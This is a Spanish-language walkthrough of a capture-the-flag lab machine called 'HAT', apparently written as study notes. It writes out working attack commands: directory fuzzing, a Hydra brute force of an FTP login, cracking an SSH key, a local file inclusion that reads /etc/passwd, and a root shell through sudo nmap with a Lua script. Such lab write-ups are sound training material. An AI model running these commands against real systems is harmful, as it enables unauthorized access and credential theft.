# HAT

## 0. HERRAMIENTAS

- Puertos filtrados
- Ataque fuerza bruta FTP (Hydra)
- RSACrack
- Binario nmap

## 1. ENUMERACION

Busco la maquina en la red con arp-scan

![Untitled](Untitled.png)

Enumeramos puertos

![Untitled](Untitled%201.png)

Vemos los siguientes puertos abiertos

- 22: Este aparece filtrado
- 80
- 65535

Lanzamos un escaneo más exhaustivo sobre esos puertos

![Untitled](Untitled%202.png)

Podemos ver que sobre el puerto **65535** hay montado un FTP

## 2. COMPROMISO DEL ENTORNO

Intentamos conectarnos con usuario anónimo, pero no lo permite

![Untitled](Untitled%203.png)

El puerto **80** nos devuelve la pagina estándar de Apache

![Untitled](Untitled%204.png)

Voy a enumerar directorios, esta vez con la herramienta **FUFF**

wfuzz -c -t 200 --hc=404 --hw=933 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [http://192.168.1.24/FUZZ](http://192.168.1.24/FUZZ)

![Untitled](Untitled%205.png)

Vemos 2 directorios interesantes

- logs
- php-scripts

Buscamos archivos con extensión log,php,txt, html dentro del directorio logs

```jsx
ffuf -c -t 200 --fc=404  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .log,.txt,.php,.html -u [http://192.168.69.234/logs/FUZZ](http://192.168.69.234/logs/FUZZ) -mc 200
```

![Untitled](Untitled%206.png)

Encontramos fichero **vsftpd.log**

Hago la misma enumeración con FUZZ

```jsx
wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt-log [http://192.168.1.24/logs/FUZZ.FUZ2Z](http://192.168.1.24/logs/FUZZ.FUZ2Z)
```

![Untitled](Untitled%207.png)

Accedo al log que nos indica y vemos el usuario admin_ftp

![Untitled](Untitled%208.png)

Con HYDRA hacemos un ataque de fuerza bruta al ftp

```jsx
hydra -t 50 -l admin_ftp -P /usr/share/wordlists/rockyou.txt [ftp://192.168.](ftp://192.168.1.24/)69.234 -s 65535 -V -f -I
```

![Untitled](Untitled%209.png)

![Untitled](Untitled%2010.png)

Ya tenemos:

- usuario: admin_ftp
- password: cowboy

Accedemos correctamente al FTP

![Untitled](Untitled%2011.png)

Descargamos los 2 ficheros que hay dentro del directorio share

![Untitled](Untitled%2012.png)

Con ls -la comprobamos el propietario de esos 2 archivos. Tenemos el usuario, pero más adelante veremos otra forma de sacar el /etc/passwd

![Untitled](Untitled%2013.png)

Vemos el contenido de la nota y del id_rsa

![Untitled](Untitled%2014.png)

![Untitled](Untitled%2015.png)

Crackeamos el id_rsa con el RSAcrack

![Untitled](Untitled%2016.png)

Hago la enumeración de php-scripts

![Untitled](Untitled%2017.png)

Encontramos el fichero file.php

![Untitled](Untitled%2018.png)

Probamos a hacer la enumeración con GOBUSTER

```jsx
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://192.168.69.234/php-scripts/' -x 'html,txt,php'
```

![Untitled](Untitled%2019.png)

Vamos a intentar explotar un LFI en el file.php

Lo vamos a hacer de 2 maneras, con WFUZZ y FFUF

- Con WFUZZ

```jsx
wfuzz -c --hc=404 --hl=0 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  [http://192.168.69.234/php-scripts/file.php?FUZZ=/etc/passwd](http://192.168.69.234/php-scripts/file.php?FUZZ=/etc/passwd) 
```

![Untitled](Untitled%2020.png)

- Con FUFF

```jsx
ffuf -c -t 200 --fc=404 --fs=0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u [http://192.168.69.234/php-scripts/file.php?FUZZ=/etc/passwd](http://192.168.69.234/php-scripts/file.php?FUZZ=/etc/passwd) -mc 200
```

![Untitled](Untitled%2021.png)

En ambos casos vemos que el 6 es susceptible al LFI

Vemos el contenido de esa url y comprobamos que el usuario cromiphi que encontramos en el ftp es usuario de la máquina

![Untitled](Untitled%2022.png)

En la enumeración vimos que el puerto 22 estaba filtrado, esto puede ser porque esté filtrado para ipv4 pero no por ipv6.

Para encontrar la ipv6 de nuestra máquina objetivo lanzamos un ping6 -c2 -I eth0 ff02::1

![Untitled](Untitled%2023.png)

Lanzamos un nmap y vemos que el puerto 22 ahora si que está abierto

![Untitled](Untitled%2024.png)

Accedemos con el usuario cromophi y el id_rsa

![Untitled](Untitled%2025.png)

![Untitled](Untitled%2026.png)

## 3. ESCALADA DE PRIVILEGIOS

![Untitled](Untitled%2027.png)

Buscamos dentro gtfobins

[https://gtfobins.github.io/gtfobins/nmap/#shell](https://gtfobins.github.io/gtfobins/nmap/#shell)

Encontramos:

![Untitled](Untitled%2028.png)

Realizamos los pasos:

```jsx
cromiphi@hat:~$ TF=$(mktemp)
cromiphi@hat:~$ echo 'os.execute("/bin/sh")' > $TF
cromiphi@hat:~$ sudo -u root /usr/bin/nmap --script=$TF
Starting Nmap 7.70 ( [https://nmap.org](https://nmap.org/) ) at 2024-03-03 13:04 CET
NSE: Warning: Loading '/tmp/tmp.PBPSL6uBGa' -- the recommended file extension is '.nse'.
```

![Untitled](Untitled%2029.png)

![Untitled](Untitled%2030.png)